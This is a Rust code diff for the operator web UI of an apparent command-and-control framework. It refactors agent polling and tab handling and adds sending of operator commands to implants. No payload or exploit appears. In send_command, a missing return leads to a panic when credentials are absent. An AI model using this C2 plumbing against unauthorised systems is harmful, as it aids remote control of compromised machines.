@@ -1,4 +1,4 @@
-use std::{ffi::CStr, str::FromStr, sync::Arc};
+use std::{collections::HashMap, ffi::CStr, str::FromStr, sync::Arc};
 
 use askama::Template;
 use axum::{
@@ -9,12 +9,13 @@ use axum::{
 };
 use chrono::{DateTime, Utc};
 use serde::Deserialize;
-use shared::tasks::AdminCommand;
+use shared::{pretty_print::print_failed, tasks::AdminCommand};
 use shared_c2_client::{AgentC2MemoryNotifications, NotificationForAgent};
 
 use crate::{
     models::{ActiveTabData, Agent, AppState, TabConsoleMessages},
     net::{IsTaskingAgent, api_request},
+    tasks::task_dispatch::dispatch_task,
 };
 
 pub type ConnectedAgentData = Vec<Agent>;
@@ -29,12 +30,14 @@ pub async fn poll_connected_agents(state: State<Arc<AppState>>) -> Response {
     let creds = &*state.creds.read().await;
 
     if creds.is_none() {
+        // TODO logging
+        println!("UNAUTH");
         return StatusCode::UNAUTHORIZED.into_response();
     }
 
     let api_result = match api_request(
         AdminCommand::ListAgents,
-        IsTaskingAgent::No,
+        &IsTaskingAgent::No,
         creds.as_ref().unwrap(),
     )
     .await
@@ -47,26 +50,30 @@ pub async fn poll_connected_agents(state: State<Arc<AppState>>) -> Response {
         }
     };
 
-    let deserialised: Vec<AgentC2MemoryNotifications> = match serde_json::from_slice(&api_result) {
-        Ok(agents) => agents,
-        Err(e) => {
-            // TODO client logging
-            println!("Failed to deser agents: {e:?}");
-            return StatusCode::INTERNAL_SERVER_ERROR.into_response();
-        }
+    let deser_agents_on_c2: Vec<AgentC2MemoryNotifications> =
+        match serde_json::from_slice(&api_result) {
+            Ok(agents) => agents,
+            Err(e) => {
+                // TODO client logging
+                println!("Failed to deser agents: {e:?}");
+                return StatusCode::INTERNAL_SERVER_ERROR.into_response();
+            }
+        };
+
+    // Reconstruct the in memory list
+    let connected_agents = {
+        let connected_agents = state.connected_agents.read().await;
+        connected_agents.clone()
     };
+    let mut buf = connected_agents;
 
-    // A temp buffer to store all agents, including ones that we currently have in memory.
-    // Rather than editing them in place, we will edit and add to this new buffer to save on
-    // a little searching later to only update changed entries. I feel this is on par memory
-    // and efficiency wise; this could be improved perhaps by noting indexes and doing something
-    // there but... I think this is ok for now. Does need profiling though
-    let mut buf: Vec<Agent> = Vec::new();
+    let mut index: HashMap<String, usize> = buf
+        .iter()
+        .enumerate()
+        .map(|(i, a)| (a.agent_id.clone(), i))
+        .collect();
 
-    let mut connected_agents_lock: tokio::sync::RwLockWriteGuard<'_, Vec<Agent>> =
-        state.connected_agents.write().await;
-
-    for (agent, is_stale, new_messages) in deserialised {
+    for (agent, is_stale, new_messages) in deser_agents_on_c2 {
         let split: Vec<&str> = agent.split('\t').collect();
 
         // Because we sent the string over separated by \t, we can use this to explode the
@@ -85,7 +92,9 @@ pub async fn poll_connected_agents(state: State<Arc<AppState>>) -> Response {
         // Try to find an existing agent - if it exists then we need to update its fields with the new poll data,
         // and determine if there are any new messages from the C2 that were pulled, if there were, add them.
         //
-        if let Some(agent) = connected_agents_lock.iter_mut().find(|a| a.agent_id == uid) {
+
+        if let Some(i) = index.get(&uid).copied() {
+            let agent = &mut buf[i];
             agent.last_check_in = last_seen;
             agent.pid = pid;
             agent.process_name = process_image;
@@ -95,13 +104,11 @@ pub async fn poll_connected_agents(state: State<Arc<AppState>>) -> Response {
                 if let Ok(Some(msgs)) =
                     serde_json::from_value::<Option<Vec<NotificationForAgent>>>(msgs)
                 {
-                    for m in msgs {
-                        agent.output_messages.push(TabConsoleMessages::from(m));
-                    }
+                    agent
+                        .output_messages
+                        .extend(msgs.into_iter().map(TabConsoleMessages::from));
                 }
             }
-
-            buf.push(agent.clone());
         } else {
             //
             // This branch runs if the agent did NOT exist in memory already within the UI
@@ -130,7 +137,10 @@ pub async fn poll_connected_agents(state: State<Arc<AppState>>) -> Response {
 
     // Unfortunately we cant do a mem::take here, we do need to clone it as we return it back to the
     // UI...
-    *connected_agents_lock = buf.clone();
+    {
+        let mut connected_agents_lock = state.connected_agents.write().await;
+        *connected_agents_lock = buf.clone();
+    }
 
     return Html(ConnectedAgentPage { data: buf }.render().unwrap()).into_response();
 }
@@ -144,6 +154,21 @@ pub struct SelectedAgent {
 #[template(path = "htmx_applets/agent_tabs.html")]
 struct TabsPage {
     tab_data: ActiveTabData,
+}
+
+pub async fn draw_tabs(state: State<Arc<AppState>>) -> Response {
+    let current_agent_id = {
+        let lock = state.active_tabs.read().await;
+
+        if let Some(agent_id) = lock.1.get(lock.0) {
+            agent_id.clone()
+        } else {
+            println!("Index not found in haystack when searching in draw_tabs.");
+            return StatusCode::INTERNAL_SERVER_ERROR.into_response();
+        }
+    };
+
+    render_tabs(current_agent_id, state.clone()).await
 }
 
 pub async fn select_agent_tab(
@@ -175,29 +200,56 @@ pub async fn select_agent_tab(
         return StatusCode::INTERNAL_SERVER_ERROR.into_response();
     }
 
-    {
-        let mut lock = state.active_tabs.write().await;
-        // if we already have the tab on the bar, just set the index to the active tab
-        if let Some(idx) = lock.1.iter().position(|a| *a == selected_agent.agent) {
-            lock.0 = idx;
+    render_tabs(selected_agent.agent.clone(), state.clone()).await
+}
 
-            let tab_page = TabsPage {
-                tab_data: (idx, lock.1.clone()),
-            };
-            return Html(tab_page.render().unwrap()).into_response();
+#[derive(Deserialize)]
+pub struct SelectedAgentIdx {
+    index: usize,
+}
+
+pub async fn select_agent_tab_idx(
+    state: State<Arc<AppState>>,
+    index: Query<SelectedAgentIdx>,
+) -> Response {
+    let tab_name = {
+        let tab_name_lock = state.active_tabs.read().await;
+
+        match tab_name_lock.1.get(index.index) {
+            Some(t) => t.clone(),
+            None => {
+                println!("Could not find selected tab by ID: {}", index.index);
+                return StatusCode::INTERNAL_SERVER_ERROR.into_response();
+            }
         }
+    };
 
-        lock.1.push(selected_agent.agent.clone());
-        // As the len is starting at an idx of 1, we need to pull it back by
-        // 1 to keep counting with the same starting reference.
-        lock.0 = lock.1.len() - 1;
+    render_tabs(tab_name, state.clone()).await
+}
+
+async fn render_tabs(needle: String, state: State<Arc<AppState>>) -> Response {
+    let mut lock = state.active_tabs.write().await;
+
+    // if we already have the tab on the bar, just set the index to the active tab
+    if let Some(idx) = lock.1.iter().position(|a| *a == needle) {
+        lock.0 = idx;
 
         let tab_page = TabsPage {
-            tab_data: (lock.0, lock.1.clone()),
+            tab_data: (idx, lock.1.clone()),
         };
-
         return Html(tab_page.render().unwrap()).into_response();
     }
+
+    lock.1.push(needle.clone());
+    // As the len is starting at an idx of 1, we need to pull it back by
+    // 1 to keep counting with the same starting reference.
+    lock.0 = lock.1.len() - 1;
+
+    let tab_page = TabsPage {
+        tab_data: (lock.0, lock.1.clone()),
+    };
+
+    return Html(tab_page.render().unwrap()).into_response();
 }
 
 #[derive(Template)]
@@ -214,7 +266,13 @@ pub async fn show_implant_messages(state: State<Arc<AppState>>) -> Response {
     let lock_tabs = state.active_tabs.read().await;
     let lock_agents = state.connected_agents.read().await;
 
-    let agent_name = lock_tabs.1.get(lock_tabs.0).unwrap();
+    let agent_name = match lock_tabs.1.get(lock_tabs.0) {
+        Some(a) => a,
+        None => {
+            println!("Tab not found.");
+            return StatusCode::INTERNAL_SERVER_ERROR.into_response();
+        }
+    };
 
     if let Some(agent) = lock_agents.iter().find(|a| a.agent_id == *agent_name) {
         let page = ImplantMessages {
@@ -236,11 +294,18 @@ pub async fn send_command(
     state: State<Arc<AppState>>,
     Form(msg): Form<SendCommandForm>,
 ) -> Response {
+    let mut tasking_agent_id: String = String::new();
+
+    //
+    // Write the input to the console
+    //
     {
         let tab_lock = state.active_tabs.read().await;
         let tab = tab_lock.1.get(tab_lock.0);
 
         if let Some(agent_id) = tab {
+            tasking_agent_id = agent_id.clone();
+
             let mut agents_lock = state.connected_agents.write().await;
             if let Some(agent) = agents_lock.iter_mut().find(|a| a.agent_id == *agent_id) {
                 agent
@@ -250,10 +315,59 @@ pub async fn send_command(
                         msg.cmd_input.clone(),
                     ));
             }
+        } else {
+            // TODO logging
+            print_failed("Could not get tab ID for agent.");
+            return StatusCode::BAD_REQUEST.into_response();
         }
     }
 
-    // todo send to c2
+    //
+    // Send the command up to the C2
+    //
+
+    let creds = {
+        // This feels a little safer than holding the tokio rwlock over several async boundaries?
+        let creds = state.creds.read().await;
+        creds.clone()
+    };
+
+    if tasking_agent_id.is_empty() || creds.is_none() {
+        let tab_lock = state.active_tabs.read().await;
+        let tab = tab_lock.1.get(tab_lock.0);
+
+        if let Some(agent_id) = tab {
+            let msg = TabConsoleMessages::non_agent_message(
+                "Error issuing command.".into(),
+                "Credentials or agent ID not found.".into(),
+            );
+            state.push_console_msg(msg, agent_id).await;
+        }
+    }
+
+    let result = dispatch_task(
+        msg.cmd_input,
+        &creds.unwrap(),
+        IsTaskingAgent::Yes(&tasking_agent_id),
+        state.clone(),
+    )
+    .await;
+
+    //
+    // If there was an error, print it to the console
+    //
+    if let Err(e) = result {
+        let tab_lock = state.active_tabs.read().await;
+        let tab = tab_lock.1.get(tab_lock.0);
+
+        if let Some(agent_id) = tab {
+            let msg = TabConsoleMessages::non_agent_message(
+                "Error issuing command.".into(),
+                e.to_string(),
+            );
+            state.push_console_msg(msg, agent_id).await;
+        }
+    }
 
     StatusCode::OK.into_response()
 }
